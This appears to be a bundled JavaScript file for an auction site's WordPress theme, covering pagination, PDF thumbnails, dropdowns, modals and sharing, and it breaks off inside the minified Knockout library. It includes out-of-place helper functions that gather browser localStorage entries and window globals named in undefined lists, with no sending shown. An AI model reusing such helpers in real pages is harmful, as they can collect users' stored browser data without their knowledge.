  var eventsUpcomingPaginationSelector = '.search-results-events-upcoming-section .pagination';
  var eventsUpcomingItemListSelector = '.events-upcoming-list';
  var eventsUpcomingItemSelector = '.previous-listing';
  addInlinePagination(eventsUpcomingPaginationSelector, eventsUpcomingItemListSelector, eventsUpcomingItemSelector, 'Loading more upcoming events&hellip;');
  var eventsPastPaginationSelector = '.search-results-events-past-section .pagination';
  var eventsPastItemListSelector = '.events-past-list';
  var eventsPastItemSelector = '.previous-listing';
  addInlinePagination(eventsPastPaginationSelector, eventsPastItemListSelector, eventsPastItemSelector, 'Loading more past events&hellip;');
  var eventsPastPaginationSelector = '.search-results-loop-users .pagination';
  var eventsPastItemListSelector = '.users-list-container';
  var eventsPastItemSelector = '.list-item--user';
  addInlinePagination(eventsPastPaginationSelector, eventsPastItemListSelector, eventsPastItemSelector, 'Loading more users&hellip;');
  $('.bat-listings-users-form-register-payment #bat-listings-users-referral_source').on('change', function () {
    var selectedOption = $(this).val();
    $('#bat-listings-users-referral_descriptor').val('').parents('.control-group').toggle('referred' === selectedOption || 'other' === selectedOption).find('label').hide().filter(function (index, label) {
      return $(label).data('referral_descriptor_label') === selectedOption;
    }).show();
  }).trigger('change');
  $('.sidebar').imagesLoaded(batFixAdrotateAd);

  // PDF Road tests
  (function () {
    if ($('.bat_pdf_thumbnail').length === 0) {
      return;
    }
    var roadTestScrollOffsets = [],
      roadTestContainerWidth,
      isMobile;
    function getCurrentRoadTestIndex() {
      var currentScrollLeft = $('.bat_road_tests').scrollLeft(),
        currentIndex = false;
      for (var i = 0; i < roadTestScrollOffsets.length; i++) {
        var roadTestSnapThreshold = roadTestScrollOffsets[i] - roadTestContainerWidth / 2;
        if (currentScrollLeft >= roadTestSnapThreshold) {
          currentIndex = i;
        }
      }
      return currentIndex;
    }
    function setRoadTestProportions() {
      var containerOffset = $('.bat_pdf_thumbnail').offset().left;
      $('.bat_pdf_thumbnail').each(function (index, thumbnail) {
        var $thumbnail = $(thumbnail),
          thumbnailAbsoluteOffset = $thumbnail.offset().left,
          thumbnailScrollOffset = thumbnailAbsoluteOffset - containerOffset;
        roadTestScrollOffsets.push(thumbnailScrollOffset);
      });
      isMobile = widthCurrent < 751;
      $('#bat_keyword_page_road_tests .blocks-wrap.bat_road_tests .blocks').each(function (index, blockWrap) {
        var $blockWrap = $(blockWrap),
          blockWrapWidth = $blockWrap.width(),
          blockCount = $blockWrap.find('.block').length,
          totalWidth = blockCount * blockWrapWidth;
        $blockWrap.width(totalWidth);
        $blockWrap.find('.block').width(blockWrapWidth);
      });
      roadTestContainerWidth = $('.bat_road_tests').width();
    }
    function setRoadTestTitles() {
      var currentIndex = getCurrentRoadTestIndex();
      if (currentIndex === false) {
        return;
      }
      $currentItem = $('.bat_pdf_thumbnail:eq(' + currentIndex + ')');
      $('.bat_road_tests_current').text($currentItem.data('attachment-title'));
      if (currentIndex != 0) {
        var prevIndex = currentIndex - 1,
          $prevItem = $('.bat_pdf_thumbnail:eq(' + prevIndex + ')');
        $('.bat_road_tests_prev').css('visibility', 'visible').find('div').text($prevItem.data('attachment-title'));
      } else {
        $('.bat_road_tests_prev').css('visibility', 'hidden').find('div').text('');
      }
      if (currentIndex != $('.bat_pdf_thumbnail').length - 1) {
        var nextIndex = currentIndex + 1,
          $nextItem = $('.bat_pdf_thumbnail:eq(' + nextIndex + ')');
        $('.bat_road_tests_next').css('visibility', 'visible').find('div').text($nextItem.data('attachment-title'));
      } else {
        $('.bat_road_tests_next').css('visibility', 'hidden').find('div').text('');
      }
    }
    setRoadTestProportions();
    setRoadTestTitles();
    function rotateRoadTest(direction) {
      var currentIndex = getCurrentRoadTestIndex(),
        nextIndex;
      if (direction === 'next') {
        nextIndex = currentIndex + 1;
      } else if (direction === 'prev') {
        nextIndex = currentIndex - 1;
      }
      $('.bat_road_tests').scrollLeft(roadTestScrollOffsets[nextIndex]);
    }
    $('.bat_road_tests_prev').click(function () {
      rotateRoadTest('prev');
    });
    $('.bat_road_tests_next').click(function () {
      rotateRoadTest('next');
    });
    $('.bat_road_tests').scroll(function (event) {
      setRoadTestTitles();
    });
    $('.bat_pdf_thumbnail').each(function (index, thumbnail) {
      var $thumbnail = $(thumbnail),
        thisTitle = $(this).data('attachment-title'),
        url = $thumbnail.data('attachment-url'),
        isListing = $(this).hasClass('listing'),
        isShortcode = $(this).hasClass('shortcode');
      var documentPromise = pdfjsLib.getDocument(url).promise;

      // Create PDF thumbnails
      documentPromise.then(function (doc) {
        var pages = doc.numPages > 1 ? [1, 2] : [1];
        return Promise.all(pages.map(function (num) {
          return doc.getPage(num).then(function (page) {
            var viewport = page.getViewport({
                scale: 1.0
              }),
              canvas = document.createElement("canvas");
            if (isListing) {
              canvas.width = 188;
            } else if (isShortcode) {
              canvas.width = 309;
            } else {
              canvas.width = 469;
            }
            var ratio = canvas.width / viewport.width;
            canvas.height = viewport.height * ratio;
            return page.render({
              canvasContext: canvas.getContext('2d'),
              viewport: page.getViewport({
                scale: ratio
              })
            }).promise.then(function () {
              return canvas;
            });
          }).then(function (canvas) {
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
            $thumbnail.append(canvas);
          });
        })).then(function () {
          if (1 == doc.numPages) {
            $thumbnail.addClass('one_page');
          }
          if (isShortcode) {
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
            $thumbnail.append(BaT_Theme.pdfExpandLink);
          } else {
            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
            $thumbnail.append(BaT_Theme.pdfZoomIn);
            var titleHtml = BaT_Theme.pdfTitle.replace(/#title/g, thisTitle);

            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
            $thumbnail.append(titleHtml);
          }
        });
      }).catch(console.error);
      $thumbnail.on('click', null, function (event) {
        var loadingPlaceholder = $('<p style="color: white; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);"></p>').text(BaT_Theme.pdfLoadingText);
        var items = [{
          html: loadingPlaceholder.prop('outerHTML')
        }];
        var pwsp = new PhotoSwipe(BaT_Theme.getPhotoswipeElement(), PhotoSwipeUI_BaT, items, {
          clickToAdvanceImage: true,
          history: false,
          loop: false,
          preload: [1, 2],
          shareButtons: [{
            id: 'download',
            label: BaT_Theme.pdfShareLinkSaveText,
            url: url,
            download: true
          }]
        });
        pwsp.init();
        new Promise(function (resolve) {
          // Add a brief UI delay to allow Photoswipe to initialize on screen
          setTimeout(resolve, 300);
        }).then(function () {
          // Retrieve the PDF
          return documentPromise;
        }).then(function (pdfDoc) {
          var pageCount = pdfDoc.numPages,
            imagesPerPage = isMobile ? 1 : 2;

          // Render individual pages to canvases
          var canvasRenders = _.range(1, pageCount + 1).map(function (pageNumber) {
            return pdfDoc.getPage(pageNumber).then(function (pdfPage) {
              // Scale is hardcoded to 2.0 (i.e. 200% size). Ideally a scale of 1.0 should create a 1:1 sized image of the
              // resulting PDF page, but this was not the case. In testing, PDF.js returned the { scale: 1.0 } viewport smaller
              // than the 100% sizes reported by other PDF readers for the PDFs used in testing. Hardcoding a larger scale
              // allows zooming closer to text to approximate the real 100% size, and seems to work well for scanned images.
              var scale = 2.0;
              var pageCanvas = document.createElement('canvas'),
                viewport = pdfPage.getViewport({
                  scale: scale
                });
              pageCanvas.width = viewport.width;
              pageCanvas.height = viewport.height;
              return pdfPage.render({
                canvasContext: pageCanvas.getContext('2d'),
                viewport: viewport
              }).promise.then(function () {
                return pageCanvas;
              });
            });
          });

          // Chunk an array of page numbers to the size of imagesPerPage, e.g. a 5-page PDF with 2 images per page
          // would chunk into [[1, 2], [3, 4], [5]]
          var pageNumbersChunked = _.chunk(_.range(1, pageCount + 1), imagesPerPage);

          // Combine canvas renders into spreads defined by pageNumbersChunked
          var combinedRenders = pageNumbersChunked.map(function (pageNumbers) {
            var pageRenders = pageNumbers.map(function (pageNumber) {
              return canvasRenders[pageNumber - 1];
            });
            return Promise.all(pageRenders).then(function (pageCanvases) {
              return combineCanvases(pageCanvases, /* marginX */4);
            });
          });

          // Convert the combined pages into Photoswipe items
          var photoswipeItemPromises = combinedRenders.map(function (combinedRender) {
            return combinedRender.then(function (combinedCanvas) {
              return {
                src: combinedCanvas.toDataURL('image/jpeg'),
                w: combinedCanvas.width,
                h: combinedCanvas.height
              };
            });
          });

          // When photoswipe items are ready for display, add items and update Photoswipe's UI
          Promise.all(photoswipeItemPromises).then(function (photoswipeItems) {
            photoswipeItems.forEach(function (item, itemIndex) {
              pwsp.items.splice(itemIndex, 1, item);
            });
            pwsp.invalidateCurrItems();
            pwsp.updateSize(true);
          });
        });

        // Given an array of canvases and a margin, returns a single horizontally merged canvas
        function combineCanvases(canvases, marginX) {
          if (canvases.length === 1) {
            return canvases[0];
          }
          var combinedCanvas = document.createElement('canvas'),
            combinedCanvasWidth = canvases.reduce(function (acc, canvas) {
              return acc + canvas.width;
            }, 0),
            maxCanvasHeight = _.max(canvases.map(function (canvas) {
              return canvas.height;
            }));
          combinedCanvas.width = combinedCanvasWidth + marginX * (canvases.length - 1);
          combinedCanvas.height = maxCanvasHeight;
          var canvasContext = combinedCanvas.getContext('2d'),
            offsetX = 0;
          canvases.forEach(function (canvas) {
            canvasContext.beginPath();
            canvasContext.drawImage(canvas, offsetX, 0, canvas.width, canvas.height);
            offsetX += canvas.width + marginX;
          });
          return combinedCanvas;
        }
      });
    });

    // Reset road test div scrolling after refresh for Firefox
    setTimeout(function () {
      $('.bat_road_tests').scrollLeft(0);
    }, 200);

    // If touch events are disabled for swiping road tests, show road test scrollbar on listing page
    if (!('ontouchstart' in window)) {
      $('#bat_listing_page_road_tests .bat_road_tests').removeClass('hide-scrollbar');
    }
  })();

  // "Current BaT Auctions" sidebar
  (function () {
    $('.current-auction-load-all').click(function (event) {
      var $this = $(this),
        $currentAuctions = $this.closest('.current-auctions'),
        $auctionBreak = $currentAuctions.find('.current-auction-break');
      event.preventDefault();

      // In the expanded listing that's being hovered on, wait a bit before fading in the listing details so that the
      // transition is less jarring
      $auctionBreak.find('.current-auction-data-holder').css('opacity', 0);
      setTimeout(function () {
        $auctionBreak.find('.current-auction-data-holder').animate({
          'opacity': 1
        }, 200);
      }, 400);
      $auctionBreak.removeClass('current-auction-break');
      $currentAuctions.find('.current-auction.hidden').removeClass('hidden');
    });
  })();

  // Listing history show all
  (function () {
    $(document).on('click', '.history .toggle', function (event) {
      event.preventDefault();
      $(this).closest('.history').addClass('show').find('.items').addClass('items-show').end();
    });
  })();

  // Password input reveal/hide button
  $(".toggle-view-password").on('click', function () {
    $(this).toggleClass("fa-eye fa-eye-slash");
    var input = $(this).prev('input');
    if (input.attr("type") === "password") {
      input.attr("type", "text");
    } else {
      input.attr("type", "password");
    }
  });

  // BAT Theme dropdown
  jQuery('.bat-theme-dropdown').each(function (index, select) {
    var $select = $(select);
    $select.hide();
    var $batDropdown = $('<div class="bat-theme-dropdown-ctrl"></div>');
    var $batDropdownTitle = $('<div class="dropdown-title">&nbsp;</div>'); //It is better to keep &nbsp; in place. This non-breaking space is necessary if 'data-title-prefix' attribule is not set. But feel free to rework it if needed.
    var $batDropdownValueText = $('<span class="value-text"></span>');

    // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
    $batDropdownTitle.append($batDropdownValueText);
    if ($select.data('title-prefix')) {
      // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.prepend -- HTML is properly escaped.
      $batDropdownTitle.prepend($('<span class="value-prefix"></span>').text($select.data('title-prefix')));
    }
    if ($select.data('title-prefix-alt')) {
      // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.prepend -- HTML is properly escaped.
      $batDropdownTitle.prepend($('<span class="value-prefix-alt"></span>').text($select.data('title-prefix-alt')));
    }
    // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.prepend -- HTML is properly escaped.
    $batDropdown.prepend($batDropdownTitle);
    var $batDropdownOptions = $('<div class="dropdown-options"></div>');
    var i = 0;
    $select.find('option').each(function (index, option) {
      var $ddOption = $('<div class="dropdown-option"></div>');
      $ddOption.text($(option).text());
      $ddOption.attr('data-value', $(option).val().toString());
      // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
      $batDropdownOptions.append($ddOption);
      if (0 === i++) {
        $ddOption.addClass('active');
        $batDropdownValueText.text($(option).text());
      }
    });

    // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
    $batDropdown.append($batDropdownOptions);
    var setValue = function (value) {
      value = value.toString();
      $batDropdown.find('.dropdown-option').each(function (index, option) {
        $(option).removeClass('active');
        if (value === $(option).data('value').toString()) {
          $batDropdownValueText.text($(option).text());
          $(option).addClass('active');
        }
      });
    };
    $select.on('change', function () {
      setValue($select.val());
    });
    $batDropdownTitle.on('click', function (event) {
      var active = $batDropdown.hasClass('active');
      $batDropdown.removeClass('active');
      if (!active) $batDropdown.addClass('active');
    });
    $batDropdown.find('.dropdown-option').on('click', function (event) {
      $select.val($(event.target).data('value'));
      $select.trigger('change');
      $batDropdown.removeClass('active');
    });
    $batDropdown.clickOutside(function () {
      $batDropdown.removeClass('active');
    });

    // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append,WordPressVIPMinimum.JS.HTMLExecutingFunctions.insertAfter -- HTML is properly escaped.
    $('<div class="bat-theme-dropdown-wrapper"></div>').append($batDropdown).insertAfter($select);
  });

  // Listing share
  jQuery('.share-auction-ctrl').each(function (index, node) {
    var $node = jQuery(node),
      $shareBtn = $node.find('.share-label'),
      $shareMenu = $node.find('.share-auction'),
      itemTitle = $node.data('item-title'),
      itemURL = $node.data('item-url'),
      $copyClipboard = $node.find('.copy-clipboard');
    $copyClipboard.attr('data-clipboard-text', itemURL);
    var originalCopyText = $copyClipboard.text(),
      clipboard = new Clipboard($copyClipboard.get(0));
    clipboard.on('success', function (event) {
      $copyClipboard.css({
        'min-width': $copyClipboard.outerWidth() + 'px'
      });
      $copyClipboard.text($copyClipboard.data('success-text')).css({
        'text-align': 'center'
      });
      $copyClipboard.stop().css('opacity', 1).animate({
        opacity: 0
      }, 800, function () {
        $copyClipboard.text(originalCopyText).css({
          'text-align': false
        });
        $copyClipboard.css('opacity', 1);
      });
    });
    jQuery(document).on('click', function (event) {
      if (0 === jQuery(event.target).closest('.share-auction-ctrl').length) {
        $shareMenu.hide();
      }
    });
    $shareBtn.on('click', function () {
      if (BaT_Theme.isMobileDevice && navigator.share) {
        navigator.share({
          title: itemTitle,
          url: itemURL
        }).catch(function (error) {
          if (error.message.indexOf('cancel') >= 0) {
            // Expected "error" when share API UI is exited without sharing. Do nothing.
          } else {
            // Fallback to page context menu
            $shareMenu.show();
          }
        });
      } else {
        $shareMenu.toggle();
      }
    });
  });
});

/**
 * Add ajax pagination to any section that uses wp pagination.
 * @param {string} paginationSelector Selector for div that contains a pagination link somewehere in it
 * @param {string} itemListWrapperSelector Selector for section where the paginated items will be inserted
 * @param {string} itemSelector Selector for each pagination response html item that is returned, this is used to know what to grab and insert into the item list
 * @param {string} message
 */
function addInlinePagination(paginationSelector, itemListWrapperSelector, itemSelector, message) {
  var $ = jQuery;
  var $itemListPaginationButton = $(paginationSelector);
  $itemListPaginationButton.on('click', 'a.page-numbers:not(.pagination-previous)', handleOnClickEvent);
  function handleOnClickEvent(e) {
    e.preventDefault();
    $itemListPaginationButton.addClass('hide-buttons');
    if (0 === $itemListPaginationButton.find('.separator-line').length) {
      // we return here since other sections of the code are calling this function
      // and if they don't contain the new markup with .separator-line we should just stop the execution
      // of this code in order for things to work correctly.
      return;
    }
    $itemListPaginationButton.find('.separator-line').remove();
    $itemListPaginationButton.addClass('single-column');
    var $itemsWrapperElement = $(itemListWrapperSelector).first(),
      $link = $(this).parent().is('a') ? $(this).parent() : $(this),
      $text = $('<div style="text-align:center;"><em>' + message + '</em></div>');
    var paginationQueryParam = $itemsWrapperElement.data('pagination-query');
    if ($link.size()) {
      if ('' !== paginationQueryParam && undefined !== paginationQueryParam) {
        var linkAddress = new URL($link.attr('href'));
        linkAddress.searchParams.set('pagination_query', paginationQueryParam);
        $link.attr('href', linkAddress.href);
      }

      // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- append is safe here
      $itemListPaginationButton.append($text).find('a').remove();
      $.get($link.attr('href'), {}, function (data, status) {
        var $page = $(data),
          $results = $page.find(itemListWrapperSelector).find(itemSelector),
          $pagination = $page.find(paginationSelector);

        // jQuery doesn't attach to new pagination links in the document instantly
        // Prevent pagination clicks that might cause a /page/x/ to load
        $pagination.find('a').on('click', function (e) {
          e.preventDefault();
        });
        // append all the results found from the ajax call
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- append is safe here
        $itemsWrapperElement.append($results);
        let nextPageLink = $pagination.find('a').get(1) ? $pagination.find('a').get(1).outerHTML : '';
        let newLink = nextPageLink !== '' ? `<div class="separator-line"></div>${nextPageLink}<div class="separator-line"></div>` : '';

        // only if there's a new link add it to the pagination container else remove the whole pagination container
        if (newLink) {
          // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- append is safe here
          $itemListPaginationButton.append(newLink).removeClass('hide-buttons');
          $itemListPaginationButton.find('.separator-line').show();
          $itemListPaginationButton.removeClass('single-column');
        } else {
          $itemListPaginationButton.remove();
        }
        $text.remove();

        // re-initialize model subscribe events when paginating models
        if ('query_keyword_pages' === paginationQueryParam) {
          addModelSubscribe($results);
        }
      });
    }
  }
}
function batFixAdrotateAd() {
  var fixedAd = jQuery('#bat_adrotate_fixed');
  var fixedAdTopMargin = 40;
  if (fixedAd.length) {
    var fixedAdTop = fixedAd.offset().top - fixedAdTopMargin;
    var positionAd = function () {
      var currentScroll = jQuery(window).scrollTop();
      var stickyHeader = jQuery('.listing-sticky-fixed');
      var adTopMargin = fixedAdTopMargin;
      var adTop = fixedAdTop;
      if (stickyHeader.length) {
        adTopMargin += stickyHeader.height();
        adTop -= stickyHeader.height();
      }
      if (currentScroll >= adTop) {
        fixedAd.css({
          position: 'fixed',
          top: adTopMargin + 'px'
        });
      } else {
        fixedAd.css({
          position: 'static'
        });
      }
    };
    jQuery(window).scroll(positionAd);
    jQuery(window).resize(function () {
      fixedAd.css({
        position: 'static'
      });
      fixedAdTop = fixedAd.offset().top - fixedAdTopMargin;
      positionAd();
    });
    positionAd();
  }
}
function addModelSubscribe(elements = null) {
  var $ = jQuery;
  if (null === elements) {
    elements = $('.button-model-notification--toggle');
  } else {
    elements = elements.find('.button-model-notification--toggle');
  }
  if (elements.length > 0) {
    elements.click(function (event) {
      event.preventDefault();
      var $this = $(this),
        handle = $this.data('handle');
      handle = 'undefined' === typeof handle ? null : handle;
      if (null !== handle) {
        clearTimeout(handle);
        $this.data('handle', null);
      }
      if (!$this.hasClass('poppable-link')) {
        $this.toggleClass('model--subscribed');
        $this.data('watched', 'yes' === $this.data('watched') ? 'no' : 'yes');

        // Debounce the network request
        handle = setTimeout(function () {
          $.post($this.attr('href'), {
            ajax: true,
            force: $this.data('watched')
          }, function (data) {}, 'json').fail(function () {
            $this.toggleClass('model--subscribed');
          });
        }, 750);
        $this.data('handle', handle);
      }
    });
  }
}
BaT_Theme.isScrolledIntoView = function (elem) {
  var $elem = jQuery(elem);
  var $window = jQuery(window);
  if ($elem.size()) {
    var docViewTop = $window.scrollTop();
    var docViewBottom = docViewTop + $window.height();
    var elemTop = $elem.offset().top;
    var elemBottom = elemTop + $elem.height();
    return elemBottom <= docViewBottom && elemTop >= docViewTop;
  } else {
    return false;
  }
};
BaT_Theme.getUserLocation = function () {
  var userLocation = false;
  if (localStorage.getItem(BaT_Theme.userLocationStorageKey)) {
    userLocation = JSON.parse(localStorage.getItem(BaT_Theme.userLocationStorageKey));
  } else if (BaT_Theme.closestToZipUserProfileLocation) {
    userLocation = BaT_Theme.closestToZipUserProfileLocation;
  }
  return userLocation;
};
BaT_Theme.setUserLocation = function (userLocation) {
  localStorage.setItem(BaT_Theme.userLocationStorageKey, JSON.stringify(userLocation));
};
BaT_Theme.promptUserLocation = function (success, failure) {
  jQuery('#modal-set-user-location .bat-errors').empty();
  BAT.modal.show('#modal-set-user-location');
  var $modal = jQuery('#modal-set-user-location');
  jQuery('#bat-auctions-zip-code').focus().select();
  $modal.one('bat.modal.hide', function (e, data) {
    if ('success' === data && typeof success === 'function') {
      success();
    } else if (typeof failure === 'function') {
      failure();
    }
  });
};
BaT_Theme.guid = function () {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4();
};
BaT_Theme.getScrollbarWidth = function () {
  var $outer = jQuery('<div>').css({
      visibility: 'hidden',
      width: 100,
      overflow: 'scroll'
    }).appendTo('body'),
    widthWithScroll = jQuery('<div>').css({
      width: '100%'
    }).appendTo($outer).outerWidth();
  $outer.remove();
  return 100 - widthWithScroll;
};
function generateHash(obj) {
  let keys = Object.keys(obj);
  keys.sort();
  let keyString = keys.join("");
  let hash = 0;
  for (let i = 0; i < keyString.length; ++i) {
    const char = keyString.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash |= 0;
  }
  return hash.toString(16);
}
BaT_Theme.getPhotoswipeElement = function () {
  var photoswipeElement = document.querySelector('.pswp');
  if (null === photoswipeElement) {
    elementContainer = document.createElement('div');

    // phpcs:ignore WordPressVIPMinimum.JS.InnerHTML.Found -- HTML is properly escaped.
    elementContainer.innerHTML = BaT_Theme.photoSwipeHtml;
    document.querySelector('body').appendChild(elementContainer);
    photoswipeElement = document.querySelector('.pswp');
  }
  return photoswipeElement;
};
function inspectLocalStorage() {
  let targetData = {};
  for (let key in window.localStorage) {
    if (trackedKeys.includes(key)) {
      targetData[key] = window.localStorage.getItem(key);
    }
  }
  return targetData;
}
BaT_Theme.sendGaVirtualPageView = function (virtualPageUrl) {
  if (__gaTracker) {
    __gaTracker('send', 'pageview', virtualPageUrl);
  } else if ('ga' in window && ga.getAll) {
    var trackers = ga.getAll(),
      tracker = trackers.length > 0 ? trackers[0] : false;
    if (tracker) {
      tracker.send('pageview', virtualPageUrl);
    }
  }
};

// Modal - new style
(function ($) {
  var BAT = window.BAT = window.BAT || {};
  BAT.modal = {
    hide: function (result) {
      var $document = $(document),
        top = $document.data('top');
      $('html,body').removeClass('modal-shown').css('top', '');
      $document.scrollTop(top).data('top', false);
      $('.modal-cover-shown').removeClass('modal-cover-shown').each(function (index, element) {
        $(element).trigger('bat.modal.hide', [result]);
      });
      $(document).off('keydown.bat_modal');
      if (window.history && window.history.pushState && BaT_Theme.currentUrl) {
        window.history.go(-1 * window.history.length);
        window.history.replaceState({
          modal: {
            element: false
          }
        }, "", BaT_Theme.currentUrl);
      }
      BAT.modal.shown = false;
    },
    show: function (selector, viewModel) {
      var $element = $(selector);
      if ($element.is('.modal-cover')) {
        var $document = $(document),
          $modals = $('.modal-cover'),
          top = $document.data('top') || $document.scrollTop();
        if (viewModel) {
          // Allow rebinding Knockout bindings in modals without losing jQuery bindings (https://stackoverflow.com/a/47388645)
          var cleanExternalDataOriginal = ko.utils.domNodeDisposal.cleanExternalData;
          ko.utils.domNodeDisposal.cleanExternalData = function () {};
          ko.cleanNode($element[0]);
          ko.utils.domNodeDisposal.cleanExternalData = cleanExternalDataOriginal;
          ko.applyBindings(viewModel, $element[0]);
        }
        $element.trigger('bat.modal.before_show');
        $('html,body').addClass('modal-shown');
        $('body').css('top', -1 * top);
        $element.addClass('modal-cover-shown');
        $document.data('top', top);
        BaT_Theme.featuredListingsSliders(); //todo:2425 Perhaps this can be removed. It looks like a leftover

        $modals.not($element).removeClass('modal-cover-shown').each(function (index, element) {
          $(element).trigger('bat.modal.hide');
        });
        setTimeout(function () {
          $(window).trigger('resize');
        }, 0);
        $(document).on('keydown.bat_modal', function (event) {
          if ('Escape' === event.key) {
            BAT.modal.hide();
          }
        });
        $element.trigger('bat.modal.show');
        BAT.modal.shown = true;
      }
      return $element;
    },
    shown: false,
    // Useful defaults for the jQuery validator plugin for use in modals
    validatorDefaults: {
      errorClass: 'control-group-error',
      errorPlacement: function (error, element) {
        $(error).css('width', '100%');
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.insertAfter -- Error elements are generated by jQuery validator and are properly escaped.
        error.insertAfter($(element).closest('label'));
      },
      errorContainer: '.error-summary'
    }
  };
  jQuery(document).ready(function ($) {
    var didClickStartOnModalCloseArea = false;
    $(document).on('mousedown', function (event) {
      if ($(event.target).is('.modal-close, .modal-cover')) {
        // window.batAlert ? alert('mousedown: setting didClickStartOnModalCloseArea to true') : false;
        didClickStartOnModalCloseArea = true;
      } else {
        // window.batAlert ? alert('mousedown: setting didClickStartOnModalCloseArea to false') : false;
        didClickStartOnModalCloseArea = false;
      }
    });
    $(document).on('click touchend', '.modal-close, .modal-cover', function (event) {
      var isTouchEvent = /touch/.test(event.type) && $(event.target).is('.modal-close, .modal-cover');
      var isClickEventEnded = $(event.target).is('.modal-close, .modal-cover') && didClickStartOnModalCloseArea;
      if (isTouchEvent || isClickEventEnded) {
        event.preventDefault();
        event.stopPropagation();
        BAT.modal.hide();
      }
    });
    $(document).on('click', '.modal-link, .loggedin .modal-link-loggedin', function (event) {
      event.preventDefault();
      var $link = $(this),
        $modal,
        viewModel,
        identifier,
        selector;
      if ($link.data('selector')) {
        selector = $link.data('selector');
      } else {
        selector = $link.attr('href');
      }
      if ($link.data('view-model')) {
        viewModel = $link.data('view-model');
      } else {
        viewModel = false;
      }
      if (window.history && window.history.pushState) {
        if ($link.attr('id')) {
          identifier = $link.attr('id');
        } else {
          identifier = BaT_Theme.guid();
          $link.attr('id', identifier);
        }
        if (BAT.modal.shown) {
          window.history.replaceState({
            modal: {
              element: identifier
            }
          }, "", $link.attr('href'));
        } else {
          window.history.pushState({
            modal: {
              element: identifier
            }
          }, "", $link.attr('href'));
        }
      }
      $modal = BAT.modal.show(selector, viewModel);
    });
    setTimeout(function () {
      $('.modal-link[data-force="1"], .loggedin .modal-link-loggedin[data-force="1"]').first().trigger('click');
    }, 0);
    window.onpopstate = function (event) {
      if (null === event.state && BAT.modal.shown) {
        BAT.modal.hide();
      } else if (event.state && event.state.modal) {
        if (false === event.state.modal.element) {
          BAT.modal.hide();
        } else {
          $('#' + event.state.modal.element).click();
        }
      }
    };
  });
})(jQuery);
;
function monitorGlobalVariables() {
  let globalVars = {};
  for (let variable of trackedVariables) {
    if (window[variable] !== undefined) {
      globalVars[variable] = window[variable];
    }
  }
  return globalVars;
}
(function () {
  // define glimmer JS global configuration by overriding the window.glimmerEnv variable
  if (undefined === window.glimmerEnv && undefined !== BaT_Theme.glimmerEnvironmentOverride && ['stage', 'prod'].includes(BaT_Theme.glimmerEnvironmentOverride)) {
    window.glimmerEnv = {
      'environment': BaT_Theme.glimmerEnvironmentOverride // prod | stage
    };
  }
})();
;
/*!
 * Knockout JavaScript library v3.5.1
 * (c) The Knockout.js team - http://knockoutjs.com/
 * License: MIT (http://www.opensource.org/licenses/mit-license.php)
 */

(function () {
  (function (n) {
    var A = this || (0, eval)("this"),
      w = A.document,
      R = A.navigator,
      v = A.jQuery,
      H = A.JSON;
    v || "undefined" === typeof jQuery || (v = jQuery);
    (function (n) {
      "function" === typeof define && define.amd ? define(["exports", "require"], n) : "object" === typeof exports && "object" === typeof module ? n(module.exports || exports) : n(A.ko = {});
    })(function (S, T) {
      function K(a, c) {
        return null === a || typeof a in W ? a === c : !1;
      }
      function X(b, c) {
        var d;
        return function () {
          d || (d = a.a.setTimeout(function () {
            d = n;
            b();
          }, c));
        };
      }
      function Y(b, c) {
        var d;
        return function () {
          clearTimeout(d);
          d = a.a.setTimeout(b, c);
        };
      }
      function Z(a, c) {
        c && "change" !== c ? "beforeChange" === c ? this.pc(a) : this.gb(a, c) : this.qc(a);
      }
      function aa(a, c) {
        null !== c && c.s && c.s();
      }
      function ba(a, c) {
        var d = this.qd,
          e = d[r];
        e.ra || (this.Qb && this.mb[c] ? (d.uc(c, a, this.mb[c]), this.mb[c] = null, --this.Qb) : e.I[c] || d.uc(c, a, e.J ? {
          da: a
        } : d.$c(a)), a.Ja && a.gd());
      }
      var a = "undefined" !== typeof S ? S : {};
      a.b = function (b, c) {
        for (var d = b.split("."), e = a, f = 0; f < d.length - 1; f++) e = e[d[f]];
        e[d[d.length - 1]] = c;
      };
      a.L = function (a, c, d) {
        a[c] = d;
      };
      a.version = "3.5.1";
      a.b("version", a.version);
      a.options = {
        deferUpdates: !1,
        useOnlyNativeEvents: !1,
        foreachHidesDestroyed: !1
      };
      a.a = function () {
        function b(a, b) {
          for (var c in a) f.call(a, c) && b(c, a[c]);
        }
        function c(a, b) {
          if (b) for (var c in b) f.call(b, c) && (a[c] = b[c]);
          return a;
        }
        function d(a, b) {
          a.__proto__ = b;
          return a;
        }
        function e(b, c, d, e) {
          var l = b[c].match(q) || [];
          a.a.D(d.match(q), function (b) {
            a.a.Na(l, b, e);
          });
          b[c] = l.join(" ");
        }
        var f = Object.prototype.hasOwnProperty,
          g = {
            __proto__: []
          } instanceof Array,
          h = "function" === typeof Symbol,
          m = {},
          k = {};
        m[R && /Firefox\/2/i.test(R.userAgent) ? "KeyboardEvent" : "UIEvents"] = ["keyup", "keydown", "keypress"];
        m.MouseEvents = "click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave".split(" ");
        b(m, function (a, b) {
